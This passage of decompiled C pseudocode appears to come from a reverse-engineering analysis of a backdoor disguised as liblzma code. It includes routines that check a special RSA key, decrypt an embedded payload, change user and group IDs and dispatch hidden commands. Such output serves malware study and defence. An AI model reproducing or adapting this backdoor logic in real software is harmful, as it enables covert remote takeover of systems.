      *(_OWORD *)&v103[25] = v34;
      v35 = *(__int128 *)((char *)v26 + 12);
      *(_DWORD *)&v103[53] = 0x20000000;
      v96[230] = 8;
      v96[239] = 1;
      *(_DWORD *)&v103[89] = 50331648;
      v103[93] = 1;
      v103[95] = 1;
      v104 = 16842752;
      *(_OWORD *)&v103[37] = v35;
      while ( v33 )
      {
        *v32 = *(_DWORD *)v31;
        v31 = (__int128 *)((char *)v31 + 4);
        ++v32;
        --v33;
      }
      v36 = 1576LL;
      v105[66] = 0x1000000;
      v105[77] = 117440512;
      *(_DWORD *)v106 = *(_DWORD *)v26;
      *(_DWORD *)&v106[3] = *(_DWORD *)((char *)v26 + 3);
      while ( 1 )
      {
        v92 = 0LL;
        if ( !(unsigned int)sub_7350(&v108[v28 + 404], v36, &v92, v93[v27], v7) || v36 < v92 )
          return 0LL;
        v28 += v92;
        v36 -= v92;
        if ( v27 )
          break;
        v27 = 1LL;
      }
      if ( v28 > 0x628 )
        return 0LL;
      v63 = &v107;
      v64 = 105LL;
      v65 = v103;
      v105[76] = _byteswap_ulong(v28 + 11);
      *(_DWORD *)&v103[17] = _byteswap_ulong(v28 + 679);
      *(_DWORD *)v103 = _byteswap_ulong(v28 + 700);
      v66 = *(_QWORD *)(a2 + 8);
      while ( v64 )
      {
        *(_DWORD *)v63 = *v65++;
        v63 = (__int128 *)((char *)v63 + 4);
        --v64;
      }
      v88 = (*(__int64 (__fastcall **)(__int128 *, _DWORD *))(v66 + 208))(v63, v65);
      if ( !v88 )
        return 0LL;
      v67 = (*(__int64 (__fastcall **)(char *, __int64, _QWORD))(*(_QWORD *)(a2 + 8) + 224LL))(&v89, 1LL, 0LL);
      if ( v67 )
      {
        v68 = (*(__int64 (__fastcall **)(__int128 *, __int64, _QWORD))(*(_QWORD *)(a2 + 8) + 224LL))(&v95, 256LL, 0LL);
        v86 = (*(__int64 (__fastcall **)(char *, __int64, _QWORD))(*(_QWORD *)(a2 + 8) + 224LL))(&v89, 1LL, 0LL);
        if ( (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)(a2 + 8) + 232LL))(
               v88,
               v68,
               v67,
               v86) != 1 )
        {
LABEL_172:
          (*(void (__fastcall **)(__int64))(*(_QWORD *)(a2 + 8) + 264LL))(v88);
          if ( v67 )
            (*(void (__fastcall **)(__int64))(*(_QWORD *)(a2 + 8) + 272LL))(v67);
          if ( v68 )
            (*(void (__fastcall **)(__int64))(*(_QWORD *)(a2 + 8) + 272LL))(v68);
          if ( v86 )
            (*(void (__fastcall **)(__int64))(*(_QWORD *)(a2 + 8) + 272LL))(v86);
          return 0LL;
        }
        v69 = *(_QWORD *)(a2 + 8);
        v70 = *(unsigned int (__fastcall **)(_BYTE *, unsigned __int64, _OWORD *, _QWORD, __int64, _QWORD))(v69 + 240);
        v71 = (*(__int64 (**)(void))(v69 + 88))();
        if ( v70(&v108[5], v28 + 399, v94, 0LL, v71, 0LL) == 1
          && (*(unsigned int (__fastcall **)(__int64, _OWORD *, __int64, __int128 *, int *, __int64))(*(_QWORD *)(a2 + 8) + 248LL))(
               672LL,
               v94,
               32LL,
               &v97,
               &v91,
               v88) == 1
          && v91 == 256 )
        {
          v72 = &v102;
          v73 = 64LL;
          v74 = &v97;
          v99[0] = 0xC00000014010000LL;
          v75 = *(_QWORD *)(a2 + 64);
          v101 = 0x10000;
          v76 = *(_QWORD *)v75;
          LODWORD(v75) = *(_DWORD *)(v75 + 8);
          v99[1] = v76;
          v100 = v75;
          while ( v73 )
          {
            *(_DWORD *)v72 = *(_DWORD *)v74;
            v74 = (__int128 *)((char *)v74 + 4);
            v72 = (unsigned __int64 *)((char *)v72 + 4);
            --v73;
          }
          v85 = v28 + 704;
          v77 = 71LL;
          v78 = *(_QWORD *)(a2 + 8);
          v79 = v99;
          v80 = &v108[v28 + 404];
          while ( v77 )
          {
            *v80 = *(_DWORD *)v79;
            v79 = (__int64 *)((char *)v79 + 4);
            ++v80;
            --v77;
          }
          (*(void (__fastcall **)(__int64, __int64 *))(v78 + 264))(v88, v79);
          v44 = &v107;
          goto LABEL_100;
        }
      }
      v68 = 0LL;
      v67 = 0LL;
      v86 = 0LL;
      goto LABEL_172;
    }
    return 0LL;
  }
  if ( v22 == 64 )
  {
    v37 = (void (__fastcall *)(_QWORD))v8[3];
    if ( v37 )
      v37(0LL);
    return 0LL;
  }
  if ( *(_WORD *)(a1 + 40) > 0x2Fu )
  {
    v38 = *(_QWORD **)(a1 + 32);
    v39 = v38[1];
    v81 = *v38;
    if ( (unsigned __int64)(v39 - 17) <= 0x3FEF )
    {
      v83 = v8[13];
      for ( i = &retaddr; ; ++i )
      {
        if ( (unsigned __int64)i >= v83 )
          return 0LL;
        v40 = (char *)*i;
        if ( (unsigned __int64)*i > 0xFFFFFF )
        {
          if ( (unsigned int)Lhc_find_func_1(*i, 16385 - v39, a2) )
            break;
        }
LABEL_86:
        ;
      }
      v82 = &v40[16385 - v39];
      while ( 1 )
      {
        if ( v40 >= v82 )
          goto LABEL_86;
        memset(v103, 0, 32);
        if ( *(_QWORD *)v40 == v81 )
        {
          if ( (unsigned int)sub_72E0(v40, v39, v103, 32LL, *(_QWORD *)(a2 + 8)) )
            break;
        }
LABEL_98:
        ++v40;
      }
      for ( j = 0LL; j != 32; ++j )
      {
        v42 = *((_BYTE *)v38 + j + 16);
        if ( (char)v103[j] > v42 || (char)v103[j] < v42 )
          goto LABEL_98;
      }
      memset(v103, 0, 57);
      if ( (unsigned int)Lparse_lzma12_0(v103, a2) )
      {
        v43 = v39 - 16;
        v44 = (__int128 *)(v40 + 16);
        v85 = v43;
        if ( (unsigned int)sub_71C0(v40 + 16, (unsigned int)v43, v103, v40, v40 + 16, *(_QWORD *)(a2 + 8)) )
        {
LABEL_100:
          v46 = *(_BYTE **)(a1 + 8);
          v47 = *(_DWORD *)a1;
          if ( !v46 )
            return 0LL;
          if ( (*v46 & 0x20) == 0 )
          {
            v50 = installed_func_3(a2, &v90, 1LL, 0LL);
            goto LABEL_113;
          }
          if ( v47 == 2 )
          {
            LOBYTE(v49) = v46[1] >> 1;
          }
          else
          {
            if ( v47 > 2 )
            {
              v49 = 1LL;
              if ( v47 == 3 )
                v49 = v46[2] & 0x1F;
              goto LABEL_111;
            }
            v48 = v46[1];
            if ( !v47 )
            {
              v49 = (v48 >> 3) & 0xF;
LABEL_111:
              v50 = installed_func_2(&v90, v49, *(_QWORD *)(a2 + 16));
LABEL_113:
              if ( !v50 )
                return 0LL;
              v51 = v99;
              v52 = 18LL;
              v53 = *(char **)(a1 + 8);
              v54 = *(_DWORD *)a1;
              v55 = *(_QWORD *)(a2 + 16);
              v87 = v90;
              v56 = v90 < 0;
              while ( v52 )
              {
                *(_DWORD *)v51 = 0;
                v51 = (__int64 *)((char *)v51 + 4);
                --v52;
              }
              if ( v56 || !v53 || !v55 || !*(_QWORD *)(v55 + 24) )
                return 0LL;
              if ( !v54 || v54 == 3 && (v53[2] & 0x20) != 0 )
              {
                if ( !(unsigned int)Lthreads_stop_0(v99, a2) )
                  return 0LL;
                *(_DWORD *)(a2 + 80) = *v53 & 1;
              }
              if ( sub_7120(v87, (__int64)v44, v85, v55) < 0 )
                return 0LL;
              if ( !v54 )
                goto LABEL_133;
              if ( v54 != 3 )
              {
LABEL_130:
                LODWORD(v97) = 0;
                if ( sub_70B0(v87, &v97, 4LL, v55) < 0 )
                  return 0LL;
                LODWORD(v97) = _byteswap_ulong(v97);
                v59 = (unsigned int)v97;
                if ( (_DWORD)v97 )
                {
                  if ( *(_QWORD *)(v55 + 72) && *(_QWORD *)(v55 + 80) )
                  {
                    while ( 1 )
                    {
                      while ( 1 )
                      {
                        v60 = 512LL;
                        if ( v59 <= 0x200 )
                          v60 = v59;
                        v61 = (*(__int64 (__fastcall **)(_QWORD, _BYTE *, __int64))(v55 + 72))(v87, v103, v60);
                        if ( v61 >= 0 )
                          break;
                        if ( *(_DWORD *)(*(__int64 (**)(void))(v55 + 80))() != 4 )
                          return 0LL;
                      }
                      if ( !v61 )
                        break;
                      v59 -= v61;
                      if ( !v59 )
                        goto LABEL_150;
                    }
                  }
                  return 0LL;
                }
LABEL_150:
                if ( v54 == 2 )
                {
                  v62 = *(void (__fastcall **)(_QWORD))(v55 + 24);
                  if ( !v62 )
                    return 0LL;
                  v62(0LL);
                }
                return 1LL;
              }
              if ( (v53[2] & 0x20) != 0 )
              {
LABEL_133:
                v58 = v102;
                v103[4] = 0;
                if ( v102 > 0x40 )
                  v58 = 64LL;
                *(_DWORD *)v103 = _byteswap_ulong(v58 + 1);
                if ( sub_7120(v87, (__int64)v103, 5LL, v55) < 0 || sub_7120(v87, v99[0], v58, v55) < 0 )
                  return 0LL;
                if ( v54 != 3 )
                  goto LABEL_130;
              }
              if ( *v53 >= 0 )
                return 1LL;
              goto LABEL_130;
            }
            LOBYTE(v49) = v48 >> 2;
          }
          v49 = (unsigned __int8)v49;
          goto LABEL_111;
        }
      }
    }
  }
  return 0LL;
}
// 859F: variable 'v23' is possibly undefined
// 85E1: variable 'v25' is possibly undefined
// 85E8: variable 'v26' is possibly undefined
// 85F3: variable 'v24' is possibly undefined
// 2360: using guessed type __int64 __fastcall Lhc_find_func_1(_QWORD, _QWORD, _QWORD);
// 70B0: using guessed type __int64 __fastcall sub_70B0(_QWORD, _QWORD, _QWORD, _QWORD);
// 71A0: using guessed type __int64 __fastcall sub_71A0(_QWORD, _QWORD);
// 71C0: using guessed type __int64 __fastcall sub_71C0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 72E0: using guessed type __int64 __fastcall sub_72E0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 7350: using guessed type __int64 __fastcall sub_7350(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 7A50: using guessed type __int64 __fastcall Lthreads_stop_0(_QWORD, _QWORD);
// 7BF0: using guessed type __int64 __fastcall Lindex_decode_1(_QWORD, _QWORD, _QWORD);
// 7C90: using guessed type __int64 __fastcall Lindex_encode_1(_QWORD, _QWORD, _QWORD, _QWORD);
// 8200: using guessed type __int64 __fastcall Lparse_lzma12_0(_QWORD, _QWORD);

//----- (0000000000008D80) ----------------------------------------------------
__int64 __fastcall Ldecode_buffer_part_0(__int64 a1, unsigned __int64 a2, __int64 a3)
{
  unsigned int v4; // eax
  unsigned __int64 v6; // rdx
  __int64 v7; // rax
  __int64 v8; // rcx
  __int64 i; // rax
  __int128 v10; // [rsp+Fh] [rbp-81h] BYREF
  __int128 v11[7]; // [rsp+1Fh] [rbp-71h] BYREF

  memset(v11, 0, 57);
  if ( !a1 )
  {
    if ( !a3 )
      return 0LL;
    goto LABEL_7;
  }
  if ( a3 )
  {
    v4 = *(_DWORD *)(a3 + 260);
    if ( v4 == 3 )
      return 1LL;
    if ( a2 > 0x12 && v4 <= 1 )
    {
      v10 = *(_OWORD *)a1;
      if ( Lparse_lzma12_0((__int64)v11, a3) )
      {
        if ( (unsigned int)sub_71C0(a1 + 16, (int)a2 - 16, (__int64)v11, (__int64)&v10, a1 + 16, *(_QWORD *)(a3 + 8)) )
        {
          v6 = *(unsigned __int16 *)(a1 + 16);
          if ( a2 - 18 >= v6 )
          {
            v7 = *(_QWORD *)(a3 + 232);
            if ( v6 < *(_QWORD *)(a3 + 224) - v7 )
            {
              v8 = *(_QWORD *)(a3 + 240) + v7;
              for ( i = 0LL; v6 != i; ++i )
                *(_BYTE *)(v8 + i) = *(_BYTE *)(a1 + i + 18);
              *(_QWORD *)(a3 + 232) += v6;
              if ( (unsigned int)sub_71C0(
                                   a1 + 16,
                                   (int)a2 - 16,
                                   (__int64)v11,
                                   (__int64)&v10,
                                   a1 + 16,
                                   *(_QWORD *)(a3 + 8)) )
                return 1LL;
            }
          }
        }
      }
    }
LABEL_7:
    *(_DWORD *)(a3 + 260) = -1;
  }
  return 0LL;
}

//----- (0000000000008ED0) ----------------------------------------------------
__int64 __fastcall Lfile_info_decode_0(__int64 a1, unsigned int a2, unsigned __int64 *a3)
{
  struct_ctx *v3; // rbp
  __int64 v4; // rbx
  __int64 setresgid; // r12
  __int64 (__fastcall *v6)(__int64, _QWORD, unsigned __int64 *); // r14
  int v8; // eax
  char **v9; // rdi
  __int64 i; // rcx
  int v11; // eax
  __int64 v12; // rdx
  __int64 v13; // rcx
  __int64 j; // rax
  int inited; // eax
  unsigned __int16 *v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // rsi
  unsigned __int64 v20; // r9
  unsigned __int64 v21; // rdx
  __int64 v22; // rax
  unsigned __int64 v23; // rcx
  char v24; // di
  __int64 v25; // rax
  unsigned __int16 *v26; // r15
  __int64 v27; // rax
  char v28; // cl
  unsigned __int16 *v29; // rsi
  unsigned __int64 v30; // rdx
  unsigned __int64 v31; // rdx
  unsigned __int16 *v32; // r15
  unsigned __int64 v33; // rdx
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // rax
  unsigned __int64 v36; // rcx
  __int64 v37; // rcx
  __int64 v38; // rdi
  __int64 v39; // rax
  __int64 v40; // r12
  __int64 v41; // rax
  void (__fastcall *v42)(_QWORD); // rax
  void (__fastcall *v44)(_QWORD); // rax
  unsigned __int64 v47; // [rsp+18h] [rbp-140h] BYREF
  _BYTE v48[57]; // [rsp+27h] [rbp-131h] BYREF
  char *v49[3]; // [rsp+60h] [rbp-F8h] BYREF
  unsigned __int64 v50[6]; // [rsp+78h] [rbp-E0h] BYREF
  __int128 v51; // [rsp+AEh] [rbp-AAh] BYREF
  char v52[98]; // [rsp+BEh] [rbp-9Ah] BYREF

  v3 = global_ctx;
  if ( global_ctx )
  {
    v4 = global_ctx->field_10;
    if ( v4 )
    {
      setresgid = global_ctx->setresgid;
      if ( setresgid )
      {
        if ( global_ctx->field_F0 )
        {
          v6 = *(__int64 (__fastcall **)(__int64, _QWORD, unsigned __int64 *))(setresgid + 72);
          if ( !v6 )
            goto LABEL_86;
          if ( HIDWORD(global_ctx->field_100) == 4 )
            return v6(a1, a2, a3);
          if ( !(unsigned int)Lstream_encoder_mt_init_part_0((__int64)global_ctx) )
            goto LABEL_81;
          v8 = HIDWORD(v3->field_100);
          if ( v8 == 4 || v8 == -1 )
            goto LABEL_81;
          v9 = v49;
          for ( i = 18LL; i; --i )
          {
            *(_DWORD *)v9 = 0;
            v9 = (char **)((char *)v9 + 4);
          }
          v47 = 0LL;
          if ( !Lstream_decoder_mt_get_progress_0(a3, (__int64)v3, (unsigned __int64 *)v49, (__int64 *)v50)
            || !(unsigned int)Lworker_start_0(v49, v50[0], &v47, (__int64)v3) )
          {
            return v6(a1, a2, a3);
          }
          Ldecode_buffer_part_0((__int64)v49[0], v47, (__int64)v3);
          v11 = HIDWORD(v3->field_100);
          if ( v11 != 3 )
          {
            if ( v11 > 3 )
            {
              if ( v11 != 4 )
                goto LABEL_81;
              return v6(a1, a2, a3);
            }
            if ( !v11 )
            {
              if ( v3->field_E8 <= 0xADuLL )
                return v6(a1, a2, a3);
              v12 = v3->field_F0;
              memset(v48, 0, sizeof(v48));
              if ( v12 )
              {
                v13 = v3->field_28;
                if ( v13 )
                {
                  if ( *(_QWORD *)(v13 + 8) )
                  {
                    if ( !v3->field_F8 )
                    {
                      v3->field_F8 = v12;
                      v51 = 0LL;
                      memset(v52, 0, 0x4AuLL);
                      for ( j = 0LL; j != 58; ++j )
                        v52[j - 16] = *(_BYTE *)(v12 + j + 2);
                      if ( Lparse_lzma12_0((__int64)v48, (__int64)v3)
                        && (unsigned int)sub_7660(
                                           *(_QWORD *)(*(_QWORD *)(v3->field_28 + 8) + 8LL * LODWORD(v3->field_100)),
                                           (__int64)&v51,
                                           0x3AuLL,
                                           0x5AuLL,
                                           v3->field_F8 + 60,
                                           (__int64)v48,
                                           (__int64)v3) )
                      {
                        HIDWORD(v3->field_100) = 1;
                        memset(v48, 0, sizeof(v48));
                        inited = Lstream_encoder_mt_init_part_0((__int64)v3);
LABEL_58:
                        if ( !inited )
                          goto LABEL_81;
                        return v6(a1, a2, a3);
                      }
                    }
                  }
                }
              }
              HIDWORD(v3->field_100) = -1;
              v3->field_F8 = 0LL;
LABEL_81:
              v41 = v3->field_10;
              if ( v41 )
              {
                v42 = *(void (__fastcall **)(_QWORD))(v41 + 24);
                if ( v42 )
                {
                  HIDWORD(v3->field_100) = -1;
                  if ( LODWORD(v3->fn_errno_location) )
                    v42(0LL);
                }
              }
              return v6(a1, a2, a3);
            }
            if ( v11 != 1 )
              goto LABEL_81;
            v16 = (unsigned __int16 *)v3->field_F8;
            if ( !v16 )
              goto LABEL_81;
            v17 = *v16;
            v18 = v3->field_E8;
            if ( v17 < v18 )
              goto LABEL_81;
            if ( v18 != v17 )
              return v6(a1, a2, a3);
            v19 = v3->field_E0;
            v20 = v3->field_98;
            if ( v19 < v20 )
              goto LABEL_86;
            v21 = v18 - 114;
            if ( v21 >= v19 - v20 )
              goto LABEL_86;
            v51 = 0LL;
            memset(v52, 0, sizeof(v52));
            v22 = 0LL;
            v23 = v21 + v3->field_F0;
            do
            {
              v24 = *(_BYTE *)(v23 + v22++);
              v52[v22 - 17] = v24;
            }
            while ( v22 != 114 );
            if ( v19 < v21 || (v25 = 0LL, v19 - v21 < v20) )
            {
LABEL_86:
              v44 = *(void (__fastcall **)(_QWORD))(v4 + 24);
              if ( v44 )
                v44(0LL);
              return 0LL;
            }
            while ( v20 != v25 )
            {
              *(_BYTE *)(v23 + v25) = *((_BYTE *)&v3->field_A0 + v25);
              ++v25;
            }
            if ( !(unsigned int)sub_7660(
                                  *(_QWORD *)(*(_QWORD *)(v3->field_28 + 8) + 8LL * LODWORD(v3->field_100)),
                                  v3->field_F0,
                                  v3->field_98 + v21,
                                  v3->field_E0,
                                  (__int64)&v51,
                                  v3->field_F8 + 2,
                                  (__int64)v3) )
            {
              HIDWORD(v3->field_100) = -1;
              goto LABEL_86;
            }
            HIDWORD(v3->field_100) = 3;
          }
          v26 = (unsigned __int16 *)v3->field_F8;
          if ( !v26 )
            goto LABEL_81;
          v27 = *v26;
          v28 = *((_BYTE *)v26 + 59);
          v29 = v26 + 87;
          v30 = v27 - 288;
          if ( v28 != 2 )
          {
            if ( v28 == 3 )
            {
              if ( *(_QWORD *)(v4 + 48) )
              {
                if ( v30 > 8 && !*((_BYTE *)v29 + v27 - 289) )
                {
                  v40 = *(_QWORD *)(v26 + 87);
                  if ( (!HIDWORD(v40)
                     || (*(unsigned int (__fastcall **)(_QWORD, _QWORD, _QWORD))(v4 + 32))(
                          HIDWORD(v40),
                          HIDWORD(v40),
                          HIDWORD(v40)) != -1)
                    && (!(_DWORD)v40
                     || (*(unsigned int (__fastcall **)(_QWORD, _QWORD, _QWORD))(v4 + 40))(
                          (unsigned int)v40,
                          (unsigned int)v40,
                          (unsigned int)v40) != -1) )
                  {
                    (*(void (__fastcall **)(unsigned __int16 *))(v4 + 48))(v26 + 91);
                    HIDWORD(v3->field_100) = 4;
                    return v6(a1, a2, a3);
                  }
                }
              }
            }
            else if ( v28 == 1 && *(_QWORD *)(v3->setresgid + 56) && v30 > 1 )
            {
              *(_BYTE *)(setresgid + 144) = *((_BYTE *)v26 + 174);
              *(_BYTE *)(setresgid + 145) = *((_BYTE *)v26 + 175);
              v31 = *(unsigned __int16 *)(setresgid + 144);
              if ( (_WORD)v31 )
              {
                v32 = v26 + 88;
                if ( v27 - 290 < v31 )
                {
                  *(_WORD *)(setresgid + 144) = 0;
                  goto LABEL_81;
                }
              }
              else
              {
                v32 = 0LL;
              }
              *(_QWORD *)(setresgid + 152) = v32;
              HIDWORD(v3->field_100) = 4;
              inited = Llzma_block_unpadded_size_1(1, 0, 0, 0, (__int64)v3);
              goto LABEL_58;
            }
            goto LABEL_81;
          }
          if ( !*(_QWORD *)(v3->setresgid + 120) )
            goto LABEL_81;
          if ( v30 <= 4 )
            goto LABEL_81;
          v33 = v26[87];
          if ( !(_WORD)v33 )
            goto LABEL_81;
          v34 = v27 - 290;
          if ( v33 >= v34 )
            goto LABEL_81;
          v35 = v34 - v33;
          if ( v35 <= 2 )
            goto LABEL_81;
          *(_BYTE *)(setresgid + 132) = *((_BYTE *)v29 + v33 + 2);
          *(_BYTE *)(setresgid + 133) = *((_BYTE *)v29 + v33 + 3);
          v36 = *(unsigned __int16 *)(setresgid + 132);
          if ( !(_WORD)v36 || v35 - 2 < v36 )
          {
            *(_WORD *)(setresgid + 132) = 0;
            goto LABEL_81;
          }
          v37 = v3->setresgid;
          v38 = v3->field_10;
          *(_QWORD *)(setresgid + 136) = (char *)v29 + v33 + 4;
          v39 = *(_QWORD *)(v37 + 32);
          if ( !v39 )
            goto LABEL_81;
          **(_QWORD **)(v37 + 120) = v39;
          if ( sub_7120(a2, (__int64)(v26 + 88), v33, v38) < 0 )
            return v6(a1, a2, a3);
        }
      }
    }
  }
  return 0LL;
}
// 8ED0: using guessed type unsigned __int64 var_140;
// 8ED0: using guessed type unsigned __int64 var_E0[6];

//----- (00000000000094D0) ----------------------------------------------------
__int64 __fastcall check_special_rsa_key(__int64 a1, __int64 a2, _DWORD *a3)
{
  __int64 v3; // rcx
  __int64 *v4; // rdi
  __int64 v6; // rax
  void (__fastcall *v7)(__int64, __int64 *, __int64 *, _QWORD); // r8
  __int64 v8; // rdi
  __int64 v9; // rax
  __int64 (*v10)(void); // rax
  unsigned int v11; // eax
  unsigned int v12; // ebx
  int v13; // eax
  unsigned __int64 v14; // rbp
  __int64 v15; // rax
  __int64 v16; // rcx
  __int64 *v17; // rdi
  __int64 *v18; // rdx
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rbx
  char *v21; // r14
  __int64 v22; // r15
  __int64 v23; // rsi
  unsigned __int64 v24; // r12
  int v25; // eax
  __int64 v26; // rdi
  __int64 v27; // rax
  __int64 v28; // r11
  __int64 v29; // rsi
  int v30; // eax
  __int64 v31; // rax
  unsigned __int64 v32; // rax
  unsigned __int64 v33; // rdx
  unsigned __int64 v34; // rax
  __int64 v35; // rdx
  __int64 v36; // rax
  __int64 v37; // r9
  __int64 v38; // rcx
  __int64 v39; // rax
  unsigned __int64 v40; // rdx
  __int64 v41; // rdx
  void (__fastcall *v42)(__int64); // rdx
  char v43; // al
  unsigned int v44; // eax
  __int64 v45; // rdx
  char v46; // r15
  unsigned int v47; // r14d
  char v48; // r11
  int v49; // eax
  int v50; // eax
  unsigned int v51; // eax
  char v52; // si
  unsigned int *v53; // r8
  __int64 v54; // r12
  __int64 (__fastcall *v55)(__int64, _QWORD, _QWORD); // rcx
  __int64 v56; // rax
  int *v57; // rdx
  int v58; // ecx
  _DWORD *v59; // rax
  int v60; // eax
  unsigned int v61; // ebp
  __int64 v62; // rbx
  __int64 v63; // r12
  __int64 v64; // r14
  __int64 v65; // rcx
  __int128 *v66; // rdi
  int v67; // eax
  __int64 v68; // rdx
  __int64 v69; // rcx
  __int64 *v70; // rdx
  int v71; // eax
  __int64 v72; // rdi
  __int64 v73; // rbp
  unsigned __int64 v74; // rax
  int v75; // eax
  __int64 v76; // rax
  int v77; // eax
  void (__fastcall *v78)(_QWORD, _QWORD, _QWORD, _QWORD, __int128 *, _QWORD); // rax
  __int64 *v79; // rdi
  __int64 v80; // rcx
  __int64 v81; // rax
  __int64 v82; // rbx
  _DWORD *v84; // rdi
  __int64 v85; // rcx
  _DWORD *v86; // rax
  __int64 v87; // rax
  void (__fastcall *v88)(_QWORD, __int64); // rax
  unsigned __int64 v89; // [rsp+0h] [rbp-5F8h] BYREF
  _DWORD *v90; // [rsp+8h] [rbp-5F0h]
  unsigned __int64 v91; // [rsp+10h] [rbp-5E8h]
  __int64 v92; // [rsp+18h] [rbp-5E0h]
  __int64 v93; // [rsp+20h] [rbp-5D8h]
  _DWORD *v94; // [rsp+28h] [rbp-5D0h]
  __int128 *v95; // [rsp+30h] [rbp-5C8h]
  __int64 v96; // [rsp+38h] [rbp-5C0h]
  int v97; // [rsp+44h] [rbp-5B4h]
  __int64 v98; // [rsp+48h] [rbp-5B0h]
  char v99; // [rsp+57h] [rbp-5A1h] BYREF
  __int64 v100; // [rsp+58h] [rbp-5A0h] BYREF
  __int64 v101; // [rsp+60h] [rbp-598h] BYREF
  __int128 v102[4]; // [rsp+68h] [rbp-590h] BYREF
  __int128 v103; // [rsp+A8h] [rbp-550h] BYREF
  __int64 v104[3]; // [rsp+B8h] [rbp-540h] BYREF
  __int16 v105; // [rsp+D0h] [rbp-528h]
  __int64 v106; // [rsp+D8h] [rbp-520h]
  char v107; // [rsp+19Eh] [rbp-45Ah]
  char v108; // [rsp+1A7h] [rbp-451h]
  __int64 v109; // [rsp+308h] [rbp-2F0h] BYREF
  __int64 v110; // [rsp+310h] [rbp-2E8h] BYREF
  _BYTE v111[21]; // [rsp+318h] [rbp-2E0h] BYREF
  char v112[114]; // [rsp+32Dh] [rbp-2CBh] BYREF
  int v113; // [rsp+39Fh] [rbp-259h] BYREF
  char v114; // [rsp+3A3h] [rbp-255h]
  char v115; // [rsp+3A4h] [rbp-254h] BYREF
  __int128 v116; // [rsp+575h] [rbp-83h] BYREF
  char v117[115]; // [rsp+585h] [rbp-73h] BYREF

  v3 = 174LL;
  v93 = a1;
  v4 = &v109;
  while ( v3 )
  {
    *(_DWORD *)v4 = 0;
    v4 = (__int64 *)((char *)v4 + 4);
    --v3;
  }
  v90 = a3;
  if ( !a2 )
  {
LABEL_218:
    if ( !v90 )
      return 0LL;
    goto LABEL_206;
  }
  if ( *(_DWORD *)(a2 + 24)
    || !v93
    || (v6 = *(_QWORD *)(a2 + 8)) == 0
    || (v7 = *(void (__fastcall **)(__int64, __int64 *, __int64 *, _QWORD))(v6 + 96)) == 0LL
    || !*(_QWORD *)(v6 + 256) )
  {
    *(_DWORD *)(a2 + 24) = 1;
    goto LABEL_218;
  }
  if ( a3 )
  {
    v8 = v93;
    *v90 = 1;
    v7(v8, &v109, &v110, 0LL);
    if ( v109 )
    {
      if ( v110 )
      {
        v9 = *(_QWORD *)(a2 + 8);
        if ( v9 )
        {
          v10 = *(__int64 (**)(void))(v9 + 104);
          if ( v10 )
          {
            v11 = v10();
            if ( v11 <= 0x4000 )
            {
              v12 = (v11 + 7) >> 3;
              if ( v12 - 20 <= 0x204 )
              {
                v13 = (*(__int64 (__fastcall **)(__int64, _BYTE *))(*(_QWORD *)(a2 + 8) + 256LL))(v109, &v111[5]);
                if ( v13 >= 0 )
                {
                  v91 = v12;
                  if ( v12 >= (unsigned __int64)v13 )
                  {
                    if ( (unsigned __int64)v13 <= 0x10 )
                      goto LABEL_206;
                    if ( !*(_DWORD *)&v111[5] )
                      goto LABEL_206;
                    if ( !*(_DWORD *)&v111[9] )
                      goto LABEL_206;
                    v14 = *(_QWORD *)&v111[13] + *(unsigned int *)&v111[9] * (unsigned __int64)*(unsigned int *)&v111[5];
                    if ( v14 > 3 )
                      goto LABEL_206;
                    v15 = *(_QWORD *)(a2 + 16);
                    if ( v15 )
                    {
                      if ( *(_QWORD *)(v15 + 16) )
                      {
                        if ( *(_QWORD *)(v15 + 24) )
                        {
                          if ( *(_QWORD *)(a2 + 48) )
                          {
                            if ( *(_DWORD *)(a2 + 352) == 456 )
                            {
                              v116 = *(_OWORD *)&v111[5];
                              if ( (unsigned int)Lparse_lzma12_0(v117, a2) )
                              {
                                if ( (unsigned int)sub_71C0(v112, v12 - 16, v117, &v116, v112, *(_QWORD *)(a2 + 8)) )
                                {
                                  v103 = 0LL;
                                  memset(v117, 0, 0x39uLL);
                                  v16 = 147LL;
                                  v102[0] = 0LL;
                                  v17 = v104;
                                  while ( v16 )
                                  {
                                    *(_DWORD *)v17 = 0;
                                    v17 = (__int64 *)((char *)v17 + 4);
                                    --v16;
                                  }
                                  v18 = *(__int64 **)(a2 + 40);
                                  memset(&v102[1], 0, 0x29uLL);
                                  if ( v18 )
                                  {
                                    if ( v18[1] )
                                    {
                                      if ( *(_QWORD *)(a2 + 8) )
                                      {
                                        if ( v91 - 16 > 0x71 )
                                        {
                                          LODWORD(v103) = v14;
                                          if ( v91 - 130 > 4 )
                                          {
                                            *(_DWORD *)v111 = v113;
                                            v111[4] = v114;
                                            v89 = v91 - 135;
                                            if ( v14 == 2 )
                                            {
                                              v19 = *(unsigned __int16 *)&v111[3];
                                              if ( v111[0] < 0 )
                                              {
                                                if ( *(_WORD *)&v111[3] )
                                                  goto LABEL_205;
                                                v20 = 0LL;
                                                v19 = 57LL;
                                                v21 = &v115;
                                                v22 = 0LL;
                                              }
                                              else
                                              {
                                                if ( (v111[1] & 1) != 0 )
                                                  v19 = *(unsigned __int16 *)&v111[3] + 8LL;
                                                v20 = v19;
                                                v21 = 0LL;
                                                v22 = 135LL;
                                              }
                                              if ( v89 >= v19 )
                                              {
                                                v23 = v19 + 5;
                                                v89 -= v19;
                                                v24 = v19 + 135;
                                                v25 = v19 + 4;
                                                v92 = v23;
LABEL_53:
                                                v94 = (_DWORD *)&v103 + 1;
                                                qmemcpy((char *)&v103 + 4, &v113, (unsigned int)(v25 + 1));
                                                v100 = 0LL;
                                                v26 = *v18;
                                                v101 = 0LL;
                                                if ( v26 )
                                                {
                                                  v27 = v18[1];
                                                  if ( v27 )
                                                  {
                                                    if ( v26 != v27 && *((_DWORD *)v18 + 6) <= 1u )
                                                    {
                                                      if ( (unsigned int)sub_74E0(v26, &v100, *(_QWORD *)(a2 + 16)) )
                                                      {
                                                        if ( (unsigned int)sub_74E0(
                                                                             *(_QWORD *)(*(_QWORD *)(a2 + 40) + 8LL),
                                                                             &v101,
                                                                             *(_QWORD *)(a2 + 16)) )
                                                        {
                                                          v96 = v100;
                                                          if ( v100 == v101 )
                                                          {
                                                            v95 = v102;
